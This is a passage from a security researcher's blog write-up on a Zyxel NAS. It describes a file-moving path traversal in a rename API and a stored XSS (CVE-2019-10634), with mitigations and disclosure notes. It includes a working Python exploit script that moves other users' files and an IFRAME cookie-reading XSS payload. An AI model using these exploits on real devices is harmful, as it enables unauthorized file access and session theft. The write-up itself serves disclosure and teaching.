| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ``` | ``` def rename_item_by_share(share, old_path, new_path, whoami):     """Rename an item(file or folder) by the specified share-based path.     share: share name     target_type: file or folder     old_path: the old path of the file or folder     new_path: the new path of the file or folder     """     share_path = find_share_path(share)     old_real_path = share_path + '/' + old_path <--     new_real_path = share_path + '/' + new_path <--     new_real_path_temp = new_real_path     try:         if os.path.exists(new_real_path):             tools.pylog('Target_Exist')             return Target_Exist         if not os.path.exists(old_real_path):             tools.pylog('Source_Not_Found')             return Source_Not_Found         os.rename(old_real_path, new_real_path) <--     except Exception as e:         tools.pylog(str(e))         return Unexcept_Error      return 'OK'  ``` |
| --- | --- |

The function `rename_item_by_share` just renames a file given a share (as seen in the function description above). To do this, the function concatenates the shares path (`share_path`) with the file path (`old_path` or `new_path`) to get an absolute path for both the source and the destination of the file. This operation would look something like `'/photos' + '/cute.txt'` to get `'/photos/cut.txt`. Finally, a few basic checks are done to ensure the file exists and will not overwrite anything. Then, the renaming is done!

### Exploitation

The vulnerability I sent in was the ability to snatch files from shares that a user did not have access to. So, with the knowledge above, a user who knew the name of a file could move the file into a location that they could view. Here's the code for the exploit:

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 ``` | ``` def file_mover(cookie,share, user,file_final_location, file_to_move, service = 1):  	""" 	Parameters:  	cookie: The auth token  	share: The current location of the user. Just needs to be something that the current user can see.  	user: The current user  	file_final_location: In correspondance to the current share, where should the file go.  	file_to_move: The file to move. The file to traverse to find within any share (private or public)  	 	The trick is that the API does not validate input from the user, allowing for users to steal files from other users.   	""" 	service = "http://maxwell-5.zyxel.me:8000" 	URL = "/cmd,/ck6fup6/fileBrowser_main/non_job_queue_operation"  	json = {'share' : share, 'view':'tree', 'whoami':user, 'action':'rename', 'target_path': file_final_location, 'username': user, 'path': file_to_move} 	cookies = {'authtok': cookie} 	r = requests.post(url=service+URL, cookies = cookies, data=json)	 	print("Check the file share now...")  ``` |
| --- | --- |

At this point, I thought that moving files between shares was really cool. However, I wanted something more malicious: the ability to move ANY file on the NAS. This could be database files, configuration files or plaintext passwords  (**CVE-2019-10630)** to gain elevation. However, whenever I left the location of the shares, I got an error message back that indicated that an unexpected error had occurred within the function.

### Down the Rabbit Hole

Because I could not see the actual error, I wanted to be able to understand what was going on! Hence, I went after the error logging that was built into the application (which was turned off). My goal was toturn these back on, but then I came across an issue. The part of the file system that had the code for the web application was flagged as **READ ONLY**.

I tried remounting the file system in multiple different ways, but could not get this to work. After this, I went after the boot process itself. Within the root directory is a file called `init`. Within here was the coding for the initial boot process of the device. However, even after altering this file to mount the file systems as writable, the init file was updated back to the original version upon reboot!? I searched for how this was being updated (potentially in the shutdown.rc) but did not see anything. Eventually, I just gave up on remounting the drive for another idea. If anyone knows how to bypass this (or what is going on) then I would love to discuss this in more detail.

While writing this post, I thought about just altering the source code of the file within an editable location, then allowing this to use the web\_framework folders modules. To my surprise, this worked! I was able to call the function within a modified Python file (which made debugging now possible)! I only had to add the `sys` package and `sys.path.append("/ram_bin/usr/local/apache/web_framework/models")` which sent the module loading location to the web application's source code.

### Damn Python's Rename Function

After all of this effort to figure out the error, the error was: `Invalid cross-device link`. Was this something that I could work around? Sadly, the [os.rename function only works when operating on functions on the same file system](https://stackoverflow.com/questions/42392600/oserror-errno-18-invalid-cross-device-link) . With how the partitioning of drives was done on the NAS, only the files within the shares could be moved around. Without this weird Python quirk this bug would have led to the complete compromise of the system. Still, moving the files between shares was a pretty interesting find. Below is an exploit video of transferring a file from the *admin* share to the viewable *photos* share.

### Mitigations

Another easy fix: just add the `is_path_in_share` into the function. This would prevent any type of directory traversal. An additional fix would be to just remove the function all together (because it is unused). As they say, the more lines of code, the harder it is to secure.

## CVE-2019-10634: XSS in Description Fields

Cross Site Scripting (XSS) enables attackers to inject client-side scripts into web pages viewed by other users. A few XSS attack scenarios are to hi-jack a users session by taking their session tokens, perform unauthorized actions as a user or to insert a crypto-miner. Because of these consequences, XSS can be a very severe bug in an application.

### Initial Searching

Because XSS is such a high impact bug, I started to look for XSS issues. My usual strategy is to find any place that user input (stored or reflected) is being shown on the web page. This gave me a good idea of the possible places for XSS. On this site, very little input was directed back to the user. In fact, I only found three main spots within the main functionality: file/folder names, searching for files and user information. As seen above, the XSS for the file names ended up not being possible... At the end of the day, it turned out that the searching for files (text that was being reflected on the page) sanitized their input correctly. However, the user information path ended up being a viable route.

### Testing for XSS

In an application where an uncountable amount of data is being displayed back on the web page, automatic scanners such as Burp Suite or Zap would be the way to go. But, with very little information being displayed back to the user, it was easy to manually test it.

For each user field I attempted some sort of XSS payload to see how the website would handle it. Because I am not expert in the XSS area, I use pre-built payloads. For the payloads themselves, I selected a few payloads from the [OWASP cheatsheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). After attempting a couple of fields on the control panel for the users (with most not working), I noticed that if I added an **I-frame** to a user description that it was added to the DOM! But, nothing was happening? No JavaScript executed?

### Understand The Payloads

This page obviously had XSS on it, but I was unable to exploit it properly. After stepping away from the bug for several days I realized that an error was occurring because of an issue with the XSS payload... Lesson learned: **know the payload** that is being sent actually does! Copying is totally fine as long as you understand what is going on. I found the issue while I was in the dev tools viewing the *console* output. An example exploit would look like `<IFRAME SRC=javascript:alert(document.cookie);></IFRAME>`. This would display the cookies to the user. Besides this, something more mischievous could be done with this vulnerability such as snagging the users session tokens.

### More Applications

Besides the XSS being used in the description field for the user information, the same exploit was possible within the **groups description** and **shared folders description**. If a bug is found, then the bug has likely occurred multiple times. So, look for reoccurring themes within an application.

### Mitigations

Mitigating XSS can be really tricky, depending on where the information is being inserted into. However, simply [HTML encoding](https://en.wikipedia.org/wiki/Character_encodings_in_HTML) any potentially malicious characters (such as '<' and '>') would patch this bug. For more on XSS prevention, use the [OWASP prevention](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md) cheatsheet.

## Conclusion

### Disclosure

Zyxel responded quite fast to the issues; which I was very happy about! I sent Zyxel full POC's, a [write up](NasWriteUp1.docx) with mitigation tactics, as well videos showing the potential of the exploits. Sadly, Zyxel decided not to fix the bugs because they all require authentication. So, these vulnerabilities will likely remain on the device.

### General Tips

I thought it would be valuable to mention a few major takeaways that have helped me tremendously throughout my research.

* Pool all knowledge of the applications functionality together to develop potential paths. One awesome part about the API was that one of the main APIs would return **full Python error messages** if an error was invoked. These error messages were extremely useful from start to finish. As a major takeaway, gather as much information as possible about a target.
* Be **patient** and **persistence**! Most of these bugs took me a very deep and rich understanding of the web application for me to find, as well as several weeks worth of total time.
* Rabbit holes are good to go down in a situation where time is not an issue. If the goal is to learn as much as possible, then please dive down some dark rabbit holes. Later on, these pieces of esoteric knowledge will come in handy!
* Hacking is just **understanding** how something works then **manipulating** it. I live by this!

### Closing the Loop

Overall, I had a wonderful time breaking the device. I hope this article has been useful to those wanting to get into the security research area! If you want to see the full source code for the exploitation, then please go [here](https://github.com/mdulin2/Zyxel_NAS326_Exploit/). If you have any questions please shoot me an email (which is in the footer); I would love to chat further about any of this or help you in anyway possible. Hack the Planet!
